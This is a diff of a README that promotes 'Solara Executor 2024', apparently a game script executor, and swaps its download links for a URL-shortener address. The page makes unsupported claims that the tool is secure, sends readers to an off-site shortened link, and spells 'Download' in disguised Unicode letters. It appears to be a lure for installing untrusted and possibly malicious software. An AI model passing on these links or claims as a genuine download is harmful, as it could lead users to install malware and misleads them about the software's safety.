@@ -1,4 +1,4 @@
-# Solara Executor 2024 – Powerful, Secure Script Execution  **[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://getwix.cc/)**
+# Solara Executor 2024 – Powerful, Secure Script Execution  **[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://getwix.short.gy/main)**
 Download **Solara Executor 2024** now to enjoy smooth, fast, and secure script execution. Unlock the potential of your scripts with the latest features and improvements.
 
 
@@ -6,7 +6,7 @@ Download **Solara Executor 2024** now to enjoy smooth, fast, and secure script e
 ![executor](https://github.com/user-attachments/assets/e185c417-fd9f-4956-8ca6-432eb786c96d)
 
 
-# ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://getwix.cc/)***   
+# ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://getwix.short.gy/main)***   
 
 Welcome to the next generation of **Solara Executor 2024**! 🚀 The most advanced, reliable, and secure tool for executing your scripts with ease and speed.  
 Experience seamless performance and stay up to date with cutting-edge features. ⚡️
